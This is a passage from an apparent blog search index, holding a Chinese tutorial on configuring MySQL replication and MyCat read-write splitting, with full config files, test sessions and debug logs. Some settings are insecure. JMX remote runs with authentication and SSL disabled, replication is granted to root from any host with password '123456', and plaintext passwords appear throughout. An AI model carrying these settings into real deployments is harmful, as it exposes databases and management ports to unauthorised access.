name=&quot;schemas&quot;&gt;mycatdb1,mycatdb2,mycatdb3,mycatdb4,mycatdb5,mycatdb6,mycatdb7,mycatdb8,mycatdb9&lt;/property&gt; &lt;property name=&quot;readOnly&quot;&gt;true&lt;/property&gt; &lt;/user&gt; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"MySQL数据库高级应用之读写分离","date":"2022-06-07T04:46:08.000Z","path":"/posts/490925f2/","text":"MySQL&#x6570;&#x636E;&#x5E93;&#x9AD8;&#x7EA7;&#x5E94;&#x7528;&#x4E4B;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x2014;&#x2014;MyCat&#x7BC7;&#x914D;&#x7F6E;MySQL&#x4E3B;&#x4ECE;Master&#x4FEE;&#x6539;&#x914D;&#x7F6E;1234567891011121314151617181920symbolic-links=0log-error=/var/log/mysqld.logpid-file=/var/run/mysqld/mysqld.pidbind-address = 0.0.0.0user=mysqlinnodb_flush_log_at_trx_commit=1sync_binlog=1log-bin=mysql-bin-masterserver-id=1binlog-do-db=habinlog-ignore-db=mysqllower_case_table_names=1skip-name-resolvecharacter-set-server=utf8collation-server=utf8_general_ci &#x521B;&#x5EFA;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x5E76;&#x8BBE;&#x7F6E;&#x6388;&#x6743;&#x7528;&#x6237;12345678910CREATE DATABASE ha;use haCREATE TABLE test(id int, name char(16));grant replication slave on *.* to root@&apos;%&apos; identified by &apos;123456&apos;;flush privileges;show master status; &#x5BFC;&#x51FA;&#x6570;&#x636E;&#x5E93;1mysqldump -uroot -p -B ha &gt; ha.sql Slave&#x4FEE;&#x6539;&#x914D;&#x7F6E;&#x6587;&#x4EF6;1234567891011121314151617symbolic-links=0log-error=/var/log/mysqld.logpid-file=/var/run/mysqld/mysqld.pidbind-address = 0.0.0.0log-bin=mysql-binserver-id=3binlog-do-db=habinlog-ignore-db=mysqllog_slave_updates=1skip-name-resolvelower_case_table_names=1character-set-server=utf8collation-server=utf8_general_ci &#x8BBE;&#x7F6E;&#x4E3B;&#x670D;&#x52A1;123change master to master_host=&apos;master_ip_addr&apos;, master_user=&apos;root&apos;, master_password=&apos;123456&apos;, master_log_file=&apos;master_db_bin&apos;;flush privileges;start slave; &#x5BFC;&#x5165;Master&#x7684;&#x6570;&#x636E;&#x5E93;1mysql -uroot -p &lt; ha.sql &#x5B89;&#x88C5;&#x914D;&#x7F6E;MyCat&#x5B89;&#x88C5;jdk&#xFF0C;&#x914D;&#x7F6E;Java&#x73AF;&#x5883;&#x53D8;&#x91CF;123mkdir /usr/javatar -zxvf jdk-8u201-linux-x64.tar.gz -C /usr/java/ 12345678910vim /etc/profileJAVA_HOME=/usr/java/jdk1.8.0_201PATH=$JAVA_HOME/bin:$PATHCLASSPATH=$JAVA_HOME/jre/lib/ext:$JAVA_HOME/lib/tools.jarexport PATH JAVA_HOME CLASSPATHMYCAT_HOME=/usr/local/mycatPATH=$MYCAT_HOME/bin:$PATHsource /etc/profile &#x5B89;&#x88C5;MyCat1tar -zxvf Mycat-server-1.6.7.3-release-20190927161129-linux.tar.gz -C /usr/local/ &#x4FEE;&#x6539;wrapper.conf&#x914D;&#x7F6E;&#x6587;&#x4EF6;123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115#********************************************************************# Wrapper Properties#********************************************************************# Java Application# &#x6539;&#x6210;JDK&#x5B89;&#x88C5;&#x76EE;&#x5F55;wrapper.java.command=/usr/java/jdk1.8.0_201/bin/javawrapper.working.dir=..# Java Main class. This class must implement the WrapperListener interface# or guarantee that the WrapperManager class is initialized. Helper# classes are provided to do this for you. See the Integration section# of the documentation for details.wrapper.java.mainclass=org.tanukisoftware.wrapper.WrapperSimpleAppset.default.REPO_DIR=libset.APP_BASE=.# Java Classpath (include wrapper.jar) Add class path elements as# needed starting from 1wrapper.java.classpath.1=lib/wrapper.jarwrapper.java.classpath.2=confwrapper.java.classpath.3=%REPO_DIR%/*# Java Library Path (location of Wrapper.DLL or libwrapper.so)wrapper.java.library.path.1=lib# Java Additional Parameters#wrapper.java.additional.1=wrapper.java.additional.1=-DMYCAT_HOME=.wrapper.java.additional.2=-serverwrapper.java.additional.3=-XX:MaxPermSize=64Mwrapper.java.additional.4=-XX:+AggressiveOptswrapper.java.additional.5=-XX:MaxDirectMemorySize=2Gwrapper.java.additional.6=-Dcom.sun.management.jmxremotewrapper.java.additional.7=-Dcom.sun.management.jmxremote.port=1984wrapper.java.additional.8=-Dcom.sun.management.jmxremote.authenticate=falsewrapper.java.additional.9=-Dcom.sun.management.jmxremote.ssl=false# &#x5982;&#x679C;MyCat&#x8FD8;&#x662F;&#x8D77;&#x4E0D;&#x6765;&#x8C03;&#x6574;&#x4E00;&#x4E0B;&#x6027;&#x80FD;&#x8981;&#x6C42;wrapper.java.additional.10=-Xmx640Mwrapper.java.additional.11=-Xms256M# Initial Java Heap Size (in MB)#wrapper.java.initmemory=3# Maximum Java Heap Size (in MB)#wrapper.java.maxmemory=64# Application parameters. Add parameters as needed starting from 1wrapper.app.parameter.1=io.mycat.MycatStartupwrapper.app.parameter.2=start#********************************************************************# Wrapper Logging Properties#********************************************************************# Format of output for the console. (See docs for formats)wrapper.console.format=PM# Log Level for console output. (See docs for log levels)wrapper.console.loglevel=INFO# Log file to use for wrapper output logging.wrapper.logfile=logs/wrapper.log# Format of output for the log file. (See docs for formats)wrapper.logfile.format=LPTM# Log Level for log file output. (See docs for log levels)wrapper.logfile.loglevel=INFO# Maximum size that the log file will be allowed to grow to before# the log is rolled. Size is specified in bytes. The default value# of 0, disables log rolling. May abbreviate with the &apos;k&apos; (kb) or# &apos;m&apos; (mb) suffix. For example: 10m = 10 megabytes.wrapper.logfile.maxsize=512m# Maximum number of rolled log files which will be allowed before old# files are deleted. The default value of 0 implies no limit.wrapper.logfile.maxfiles=30# Log Level for sys/event log output. (See docs for log levels)wrapper.syslog.loglevel=NONE#********************************************************************# Wrapper Windows Properties#********************************************************************# Title to use when running as a consolewrapper.console.title=Mycat-server#********************************************************************# Wrapper Windows NT/2000/XP Service Properties#********************************************************************# WARNING - Do not modify any of these properties when an application# using this configuration file has been installed as a service.# Please uninstall the service before modifying this section. The# service can then be reinstalled.# Name of the servicewrapper.ntservice.name=mycat# Display name of the servicewrapper.ntservice.displayname=Mycat-server# Description of the servicewrapper.ntservice.description=The project of Mycat-server# Service dependencies. Add dependencies as needed starting from 1wrapper.ntservice.dependency.1=# Mode in which the service is installed. AUTO_START or DEMAND_STARTwrapper.ntservice.starttype=AUTO_START# Allow the service to interact with the desktop.wrapper.ntservice.interactive=falsewrapper.ping.timeout=120configuration.directory.in.classpath.first=conf &#x4FEE;&#x6539;server.xml123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!-- - - Licensed under the Apache License, Version 2.0 (the &quot;License&quot;); - you may not use this file except in compliance with the License. - You may obtain a copy of the License at - - http://www.apache.org/licenses/LICENSE-2.0 - - Unless required by applicable law or agreed to in writing, software - distributed under the License is distributed on an &quot;AS IS&quot; BASIS, - WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. - See the License for the specific language governing permissions and - limitations under the License. --&gt;&lt;!DOCTYPE mycat:server SYSTEM &quot;server.dtd&quot;&gt;&lt;mycat:server xmlns:mycat=&quot;http://io.mycat/&quot;&gt; &lt;system&gt; &lt;property name=&quot;nonePasswordLogin&quot;&gt;0&lt;/property&gt; &lt;!-- 0&#x4E3A;&#x9700;&#x8981;&#x5BC6;&#x7801;&#x767B;&#x9646;&#x3001;1&#x4E3A;&#x4E0D;&#x9700;&#x8981;&#x5BC6;&#x7801;&#x767B;&#x9646; ,&#x9ED8;&#x8BA4;&#x4E3A;0&#xFF0C;&#x8BBE;&#x7F6E;&#x4E3A;1&#x5219;&#x9700;&#x8981;&#x6307;&#x5B9A;&#x9ED8;&#x8BA4;&#x8D26;&#x6237;--&gt; &lt;property name=&quot;useHandshakeV10&quot;&gt;1&lt;/property&gt; &lt;property name=&quot;useSqlStat&quot;&gt;0&lt;/property&gt; &lt;!-- 1&#x4E3A;&#x5F00;&#x542F;&#x5B9E;&#x65F6;&#x7EDF;&#x8BA1;&#x3001;0&#x4E3A;&#x5173;&#x95ED; --&gt; &lt;property name=&quot;useGlobleTableCheck&quot;&gt;0&lt;/property&gt; &lt;!-- 1&#x4E3A;&#x5F00;&#x542F;&#x5168;&#x52A0;&#x73ED;&#x4E00;&#x81F4;&#x6027;&#x68C0;&#x6D4B;&#x3001;0&#x4E3A; &#x5173;&#x95ED; --&gt; &lt;property name=&quot;sqlExecuteTimeout&quot;&gt;300&lt;/property&gt; &lt;!-- SQL &#x6267;&#x884C;&#x8D85;&#x65F6; &#x5355;&#x4F4D;:&#x79D2;--&gt; &lt;property name=&quot;sequnceHandlerType&quot;&gt;2&lt;/property&gt; &lt;!--&lt;property name=&quot;sequnceHandlerPattern&quot;&gt;(?:(\\s*next\\s+value\\s+for\\s*MYCATSEQ_(\\w+))(,|\\)|\\s)*)+&lt;/property&gt;--&gt; &lt;!--&#x5FC5;&#x987B;&#x5E26;&#x6709;MYCATSEQ_&#x6216;&#x8005; mycatseq_&#x8FDB;&#x5165;&#x5E8F;&#x5217;&#x5339;&#x914D;&#x6D41;&#x7A0B; &#x6CE8;&#x610F;MYCATSEQ_&#x6709;&#x7A7A;&#x683C;&#x7684;&#x60C5;&#x51B5;--&gt; &lt;property name=&quot;sequnceHandlerPattern&quot;&gt;(?:(\\s*next\\s+value\\s+for\\s*MYCATSEQ_(\\w+))(,|\\)|\\s)*)+&lt;/property&gt; &lt;property name=&quot;subqueryRelationshipCheck&quot;&gt;false&lt;/property&gt; &lt;!-- &#x5B50;&#x67E5;&#x8BE2;&#x4E2D;&#x5B58;&#x5728;&#x5173;&#x8054;&#x67E5;&#x8BE2;&#x7684;&#x60C5;&#x51B5;&#x4E0B;,&#x68C0;&#x67E5;&#x5173;&#x8054;&#x5B57;&#x6BB5;&#x4E2D;&#x662F;&#x5426;&#x6709;&#x5206;&#x7247;&#x5B57;&#x6BB5; .&#x9ED8;&#x8BA4; false --&gt; &lt;!-- &lt;property name=&quot;useCompression&quot;&gt;1&lt;/property&gt;--&gt; &lt;!--1&#x4E3A;&#x5F00;&#x542F;mysql&#x538B;&#x7F29;&#x534F;&#x8BAE;--&gt; &lt;!-- &lt;property name=&quot;fakeMySQLVersion&quot;&gt;5.6.20&lt;/property&gt;--&gt; &lt;!--&#x8BBE;&#x7F6E;&#x6A21;&#x62DF;&#x7684;MySQL&#x7248;&#x672C; &#x53F7;--&gt; &lt;!-- &lt;property name=&quot;processorBufferChunk&quot;&gt;40960&lt;/property&gt; --&gt; &lt;!-- &lt;property name=&quot;processors&quot;&gt;1&lt;/property&gt; &lt;property name=&quot;processorExecutor&quot;&gt;32&lt;/property&gt; --&gt; &lt;!--&#x9ED8;&#x8BA4;&#x4E3A;type 0: DirectByteBufferPool | type 1 ByteBufferArena | type 2 NettyBufferPool --&gt; &lt;property name=&quot;processorBufferPoolType&quot;&gt;0&lt;/property&gt; &lt;!--&#x9ED8;&#x8BA4;&#x662F;65535 64K &#x7528;&#x4E8E;sql&#x89E3;&#x6790;&#x65F6;&#x6700;&#x5927;&#x6587;&#x672C;&#x957F;&#x5EA6; --&gt; &lt;!--&lt;property name=&quot;maxStringLiteralLength&quot;&gt;65535&lt;/property&gt;--&gt; &lt;!--&lt;property name=&quot;sequnceHandlerType&quot;&gt;0&lt;/property&gt;--&gt; &lt;!--&lt;property name=&quot;backSocketNoDelay&quot;&gt;1&lt;/property&gt;--&gt; &lt;!--&lt;property name=&quot;frontSocketNoDelay&quot;&gt;1&lt;/property&gt;--&gt; &lt;!--&lt;property name=&quot;processorExecutor&quot;&gt;16&lt;/property&gt;--&gt; &lt;!-- &lt;property name=&quot;serverPort&quot;&gt;8066&lt;/property&gt; &lt;property name=&quot;managerPort&quot;&gt;9066&lt;/property&gt; &lt;property name=&quot;idleTimeout&quot;&gt;300000&lt;/property&gt; &lt;property name=&quot;bindIp&quot;&gt;0.0.0.0&lt;/property&gt; &lt;property name=&quot;dataNodeIdleCheckPeriod&quot;&gt;300000&lt;/property&gt; 5 * 60 * 1000L; //&#x8FDE;&#x63A5;&#x7A7A;&#x95F2;&#x68C0;&#x67E5; &lt;property name=&quot;frontWriteQueueSize&quot;&gt;4096&lt;/property&gt; &lt;property name=&quot;processors&quot;&gt;32&lt;/property&gt; --&gt; &lt;!--&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x5F00;&#x5173;&#xFF0C;0&#x4E3A;&#x4E0D;&#x8FC7;&#x6EE4;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#xFF0C;1&#x4E3A;&#x8FC7;&#x6EE4;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#xFF08;&#x5982;&#x679C;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x5185; &#x53EA;&#x6D89;&#x53CA;&#x5168;&#x5C40;&#x8868;&#xFF0C;&#x5219;&#x4E0D;&#x8FC7;&#x6EE4;&#xFF09;&#xFF0C;2&#x4E3A;&#x4E0D;&#x8FC7;&#x6EE4;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;,&#x4F46;&#x662F;&#x8BB0;&#x5F55;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x65E5;&#x5FD7;--&gt; &lt;property name=&quot;handleDistributedTransactions&quot;&gt;0&lt;/property&gt; &lt;!-- off heap for merge/order/group/limit 1&#x5F00;&#x542F; 0&#x5173;&#x95ED; --&gt; &lt;property name=&quot;useOffHeapForMerge&quot;&gt;0&lt;/property&gt; &lt;!-- &#x5355;&#x4F4D;&#x4E3A;m --&gt; &lt;property name=&quot;memoryPageSize&quot;&gt;64k&lt;/property&gt; &lt;!-- &#x5355;&#x4F4D;&#x4E3A;k --&gt; &lt;property name=&quot;spillsFileBufferSize&quot;&gt;1k&lt;/property&gt; &lt;property name=&quot;useStreamOutput&quot;&gt;0&lt;/property&gt; &lt;!-- &#x5355;&#x4F4D;&#x4E3A;m --&gt; &lt;property name=&quot;systemReserveMemorySize&quot;&gt;384m&lt;/property&gt; &lt;!--&#x662F;&#x5426;&#x91C7;&#x7528;zookeeper&#x534F;&#x8C03;&#x5207;&#x6362; --&gt; &lt;property name=&quot;useZKSwitch&quot;&gt;false&lt;/property&gt; &lt;!-- XA Recovery Log&#x65E5;&#x5FD7;&#x8DEF;&#x5F84; --&gt; &lt;!--&lt;property name=&quot;XARecoveryLogBaseDir&quot;&gt;./&lt;/property&gt;--&gt; &lt;!-- XA Recovery Log&#x65E5;&#x5FD7;&#x540D;&#x79F0; --&gt; &lt;!--&lt;property name=&quot;XARecoveryLogBaseName&quot;&gt;tmlog&lt;/property&gt;--&gt; &lt;!--&#x5982;&#x679C;&#x4E3A; true&#x7684;&#x8BDD; &#x4E25;&#x683C;&#x9075;&#x5B88;&#x9694;&#x79BB;&#x7EA7;&#x522B;,&#x4E0D;&#x4F1A;&#x5728;&#x4EC5;&#x4EC5;&#x53EA;&#x6709;select&#x8BED;&#x53E5;&#x7684;&#x65F6;&#x5019;&#x5728;&#x4E8B;&#x52A1;&#x4E2D;&#x5207;&#x6362;&#x8FDE;&#x63A5;--&gt; &lt;property name=&quot;strictTxIsolation&quot;&gt;false&lt;/property&gt; &lt;property name=&quot;useZKSwitch&quot;&gt;true&lt;/property&gt; &lt;/system&gt; &lt;!-- &#x5168;&#x5C40;SQL&#x9632;&#x706B;&#x5899;&#x8BBE;&#x7F6E; --&gt; &lt;!--&#x767D;&#x540D;&#x5355;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x901A;&#x914D;&#x7B26;%&#x6216;&#x7740;*--&gt; &lt;!--&#x4F8B;&#x5982;&lt;host host=&quot;127.0.0.*&quot; user=&quot;root&quot;/&gt;--&gt; &lt;!--&#x4F8B;&#x5982;&lt;host host=&quot;127.0.*&quot; user=&quot;root&quot;/&gt;--&gt; &lt;!--&#x4F8B;&#x5982;&lt;host host=&quot;127.*&quot; user=&quot;root&quot;/&gt;--&gt; &lt;!--&#x4F8B;&#x5982;&lt;host host=&quot;1*7.*&quot; user=&quot;root&quot;/&gt;--&gt; &lt;!--&#x8FD9;&#x4E9B;&#x914D;&#x7F6E;&#x60C5;&#x51B5;&#x4E0B;&#x5BF9;&#x4E8E;127.0.0.1&#x90FD;&#x80FD;&#x4EE5;root&#x8D26;&#x6237;&#x767B;&#x5F55;--&gt; &lt;!-- &lt;firewall&gt; &lt;whitehost&gt; &lt;host host=&quot;1*7.0.0.*&quot; user=&quot;root&quot;/&gt; &lt;/whitehost&gt; &lt;blacklist check=&quot;false&quot;&gt; &lt;/blacklist&gt; &lt;/firewall&gt; --&gt; &lt;!-- fnaichu:&#x4FEE;&#x6539;&#x76F8;&#x5173;&#x6570;&#x636E;&#x5E93;&#x914D;&#x7F6E;&#xFF1A; --&gt; &lt;user name=&quot;root&quot; defaultAccount=&quot;true&quot;&gt; &lt;property name=&quot;password&quot;&gt;ccc.456&lt;/property&gt; &lt;property name=&quot;schemas&quot;&gt;ha&lt;/property&gt; &lt;!-- &#x8868;&#x7EA7; DML &#x6743;&#x9650;&#x8BBE;&#x7F6E; --&gt; &lt;!-- &lt;privileges check=&quot;false&quot;&gt; &lt;schema name=&quot;TESTDB&quot; dml=&quot;0110&quot; &gt; &lt;table name=&quot;tb01&quot; dml=&quot;0000&quot;&gt;&lt;/table&gt; &lt;table name=&quot;tb02&quot; dml=&quot;1111&quot;&gt;&lt;/table&gt; &lt;/schema&gt; &lt;/privileges&gt; --&gt; &lt;/user&gt; &lt;!-- fnaichu:&#x4FEE;&#x6539;&#x8FD9;&#x91CC; --&gt; &lt;user name=&quot;user&quot;&gt; &lt;property name=&quot;password&quot;&gt;user&lt;/property&gt; &lt;property name=&quot;schemas&quot;&gt;ha&lt;/property&gt; &lt;property name=&quot;readOnly&quot;&gt;true&lt;/property&gt; &lt;/user&gt;&lt;/mycat:server&gt; &#x4FEE;&#x6539;schema.xml12345678910111213&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE mycat:schema SYSTEM &quot;schema.dtd&quot;&gt;&lt;mycat:schema xmlns:mycat=&quot;http://io.mycat/&quot;&gt;&lt;schema name=&quot;ha&quot; checkSQLschema=&quot;false&quot; sqlMaxLimit=&quot;100&quot; dataNode=&apos;dn1&apos;&gt; &lt;/schema&gt; &lt;dataNode name=&quot;dn1&quot; dataHost=&quot;dthost&quot; database=&quot;ha&quot;/&gt; &lt;dataHost name=&quot;dthost&quot; maxCon=&quot;500&quot; minCon=&quot;10&quot; balance=&quot;3&quot; writeType=&quot;0&quot; dbType=&quot;mysql&quot; dbDriver=&quot;native&quot; switchType=&quot;1&quot; slaveThreshold=&quot;100&quot;&gt; &lt;heartbeat&gt;select user()&lt;/heartbeat&gt; &lt;writeHost host=&quot;rhel7&quot; url=&quot;192.168.73.21:3306&quot; user=&quot;root&quot; password=&quot;ccc.456&quot;&gt; &lt;readHost host=&quot;rhel_sqlsrv&quot; url=&quot;192.168.73.22:3306&quot; user=&quot;root&quot; password=&quot;ccc.456&quot; /&gt; &lt;/writeHost&gt; &lt;/dataHost&gt;&lt;/mycat:schema&gt; &#x4FEE;&#x6539;log4j2.xml&#x6587;&#x4EF6;12345678910111213141516171819202122232425262728293031323334&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;Configuration status=&quot;WARN&quot;&gt; &lt;Appenders&gt; &lt;Console name=&quot;Console&quot; target=&quot;SYSTEM_OUT&quot;&gt; &lt;PatternLayout pattern=&quot;%d [%-5p][%t] %m %throwable{full} (%C:%F:%L) %n&quot;/&gt; &lt;/Console&gt; &lt;RollingFile name=&quot;RollingFile&quot; fileName=&quot;${sys:MYCAT_HOME}/logs/mycat.log&quot; filePattern=&quot;${sys:MYCAT_HOME}/logs/$${date:yyyy-MM}/mycat-%d{MM-dd}-%i.log.gz&quot;&gt; &lt;PatternLayout&gt; &lt;Pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} %5p [%t] (%l) - %m%n&lt;/Pattern&gt; &lt;/PatternLayout&gt; &lt;Policies&gt; &lt;OnStartupTriggeringPolicy/&gt; &lt;SizeBasedTriggeringPolicy size=&quot;250 MB&quot;/&gt; &lt;TimeBasedTriggeringPolicy/&gt; &lt;/Policies&gt; &lt;/RollingFile&gt; &lt;/Appenders&gt; &lt;Loggers&gt; &lt;!--&lt;AsyncLogger name=&quot;io.mycat&quot; level=&quot;info&quot; includeLocation=&quot;true&quot; additivity=&quot;false&quot;&gt;--&gt; &lt;!--&lt;AppenderRef ref=&quot;Console&quot;/&gt;--&gt; &lt;!--&lt;AppenderRef ref=&quot;RollingFile&quot;/&gt;--&gt; &lt;!--&lt;/AsyncLogger&gt;--&gt; &lt;!-- fnaichu:&#x8C03;&#x6574;&#x65E5;&#x5FD7;&#x7EA7;&#x522B; --&gt; &lt;asyncRoot level=&quot;debug&quot; includeLocation=&quot;true&quot;&gt; &lt;!--&lt;AppenderRef ref=&quot;Console&quot; /&gt;--&gt; &lt;AppenderRef ref=&quot;RollingFile&quot;/&gt; &lt;/asyncRoot&gt; &lt;/Loggers&gt;&lt;/Configuration&gt; &#x6D4B;&#x8BD5;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x76EE;&#x524D;MyCAT&#x6709;&#x4E24;&#x4E2A;&#x7AEF;&#x53E3;&#xFF0C;8066&#x6570;&#x636E;&#x7AEF;&#x53E3;&#xFF0C;9066&#x7BA1;&#x7406;&#x7AEF;&#x53E3;&#xFF0C;&#x6D4B;&#x8BD5;&#x8BFB;&#x5199;&#x64CD;&#x4F5C;&#x7528;8066&#x6570;&#x636E;&#x7AEF;&#x53E3; 12345678[root@ctos7mini ~]&amp; netstat -pantul | grep 66tcp6 0 0 :::46667 :::* LISTEN 4136/javatcp6 0 0 :::8066 :::* LISTEN 4136/javatcp6 0 0 :::9066 :::* LISTEN 4136/java[root@ctos7mini ~]# 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950[root@ctos7mini ~]# mysql -uroot -pccc.456 -h192.168.73.20 -P8066mysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 5Server version: 5.6.29-mycat-1.6.7.3-release-20190927161129 MyCat Server (OpenCloudDB)Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.mysql&gt; show databases;+----------+| DATABASE |+----------+| ha |+----------+1 row in set (0.00 sec)mysql&gt;[root@ctos7mini ~]# mysql -uroot -pccc.456 -h192.168.73.20 -P9066mysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 4Server version: 5.6.29-mycat-1.6.7.3-release-20190927161129 MyCat Server (monitor)Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.mysql&gt; show databases;+----------+| DATABASE |+----------+| ha |+----------+1 row in set (0.00 sec)mysql&gt; &#x89C2;&#x5BDF;&#x65E5;&#x5FD7;&#x53D8;&#x5316; 1tail -f /usr/local/mycat/logs/mycat.log 12345678910111213141516171819202122232022-05-08 01:19:04.198 DEBUG [$_NIOREACTOR-0-RW] (io.mycat.server.NonBlockingSession.releaseConnection(NonBlockingSession.java:386)) - release connection MySQLConnection [id=11, lastTime=1651943944189, user=root, schema=ha, old shema=ha, borrowed=true, fromSlaveDB=true, threadId=15, charset=utf8, txIsolation=3, autocommit=true, attachment=dn1{select * from test}, respHandler=SingleNodeHandler [node=dn1{select * from test}, packetId=6], host=192.168.73.22, port=3306, statusSync=null, writeQueue=0, modifiedSQLExecuted=false]2022-05-08 01:22:56.420 DEBUG [$_NIOREACTOR-0-RW] (io.mycat.server.NonBlockingSession.releaseConnection(NonBlockingSession.java:386)) - release connection MySQLConnection [id=10, lastTime=1651944176407, user=root, schema=ha, old shema=ha, borrowed=true, fromSlaveDB=false, threadId=23, charset=utf8, txIsolation=3, autocommit=true, attachment=dn1{insert into test values (2,&apos;superman&apos;)}, respHandler=SingleNodeHandler [node=dn1{insert into test values (2,&apos;superman&apos;)}, packetId=1], host=192.168.73.21, port=3306, statusSync=null, writeQueue=0, modifiedSQLExecuted=true]2022-05-08 01:36:04.542 DEBUG [$_NIOREACTOR-0-RW] (io.mycat.server.NonBlockingSession.execute(NonBlockingSession.java:126)) - ServerConnection [id=3, schema=ha, host=192.168.73.20, user=root,txIsolation=3, autocommit=true, schema=ha, executeSql=insert into test values (2,&apos;superman&apos;)]insert into test values (2,&apos;superman&apos;), route={ 1 -&gt; dn1{insert into test values (2,&apos;superman&apos;)}} rrs2022-05-08 01:36:04.542 DEBUG [$_NIOREACTOR-0-RW] (io.mycat.backend.mysql.nio.handler.SingleNodeHandler.execute(SingleNodeHandler.java:170)) - rrs.getRunOnSlave() default2022-05-08 01:36:04.542 DEBUG [$_NIOREACTOR-0-RW] (io.mycat.backend.mysql.nio.handler.SingleNodeHandler.execute(SingleNodeHandler.java:172)) - node.getRunOnSlave() default2022-05-08 01:36:04.542 DEBUG [$_NIOREACTOR-0-RW] (io.mycat.backend.mysql.nio.handler.SingleNodeHandler.execute(SingleNodeHandler.java:182)) - node.getRunOnSlave() null2022-05-08 01:36:04.542 DEBUG [$_NIOREACTOR-0-RW] (io.mycat.backend.mysql.nio.handler.SingleNodeHandler.execute(SingleNodeHandler.java:184)) - node.getRunOnSlave() null2022-05-08 01:36:04.542 DEBUG [$_NIOREACTOR-0-RW] (io.mycat.backend.datasource.PhysicalDBNode.getConnection(PhysicalDBNode.java:102)) - rrs.getRunOnSlave() default2022-05-08 01:36:04.542 DEBUG [$_NIOREACTOR-0-RW] (io.mycat.backend.datasource.PhysicalDBNode.getConnection(PhysicalDBNode.java:133)) - rrs.getRunOnSlave() default2022-05-08 01:36:04.554 DEBUG [$_NIOREACTOR-0-RW] (io.mycat.server.NonBlockingSession.releaseConnection(NonBlockingSession.java:386)) - release connection MySQLConnection [id=10, lastTime=1651944964528, user=root, schema=ha, old shema=ha, borrowed=true, fromSlaveDB=false, threadId=23, charset=utf8, txIsolation=3, autocommit=true, attachment=dn1{insert into test values (2,&apos;superman&apos;)}, respHandler=SingleNodeHandler [node=dn1{insert into test values (2,&apos;superman&apos;)}, packetId=1], host=192.168.73.21, port=3306, statusSync=null, writeQueue=0, modifiedSQLExecuted=true]2022-05-08 01:36:04.554 DEBUG [$_NIOREACTOR-0-RW] (io.mycat.backend.datasource.PhysicalDatasource.releaseChannel(PhysicalDatasource.java:633)) - release channel MySQLConnection [id=10, lastTime=1651944964528, user=root, schema=ha, old shema=ha, borrowed=true, fromSlaveDB=false, threadId=23, charset=utf8, txIsolation=3, autocommit=true, attachment=null, respHandler=null, host=192.168.73.21, port=3306, statusSync=null, writeQueue=0, modifiedSQLExecuted=false]2022-05-08 01:36:40.600 DEBUG [$_NIOREACTOR-0-RW] (io.mycat.backend.datasource.PhysicalDBPool.getRWBanlanceCon(PhysicalDBPool.java:551)) - select read source rhel_sqlsrv for dataHost:dthost2022-05-08 01:36:40.601 DEBUG [$_NIOREACTOR-0-RW] (io.mycat.server.NonBlockingSession.releaseConnection(NonBlockingSession.java:386)) - release connection MySQLConnection [id=17, lastTime=1651945000587, user=root, schema=ha, old shema=ha, borrowed=true, fromSlaveDB=true, threadId=20, charset=utf8, txIsolation=3, autocommit=true, attachment=dn1{select * from test}, respHandler=SingleNodeHandler [node=dn1{select * from test}, packetId=10], host=192.168.73.22, port=3306, statusSync=null, writeQueue=0, modifiedSQLExecuted=false]2022-05-08 01:53:32.188 DEBUG [Timer0] (io.mycat.sqlengine.SQLJob.connectionAcquired(SQLJob.java:89)) - con query sql:select user() to con:MySQLConnection [id=1, lastTime=1651946012188, user=root, schema=ha, old shema=ha, borrowed=true, fromSlaveDB=false, threadId=22, charset=utf8, txIsolation=3, autocommit=true, attachment=null, respHandler=null, host=192.168.73.21, port=3306, statusSync=null, writeQueue=0, modifiedSQLExecuted=false]2022-05-08 01:53:32.188 DEBUG [Timer0] (io.mycat.sqlengine.SQLJob.connectionAcquired(SQLJob.java:89)) - con query sql:select user() to con:MySQLConnection [id=14, lastTime=1651946012188, user=root, schema=ha, old shema=ha, borrowed=true, fromSlaveDB=true, threadId=18, charset=utf8, txIsolation=3, autocommit=true, attachment=null, respHandler=null, host=192.168.73.22, port=3306, statusSync=null, writeQueue=0, modifiedSQLExecuted=false] &#x8BFB;&#x64CD;&#x4F5C;&#x662F;&#x5728;Slave 192.168.73.22&#x4E0A;&#x8FDB;&#x884C;&#x7684; 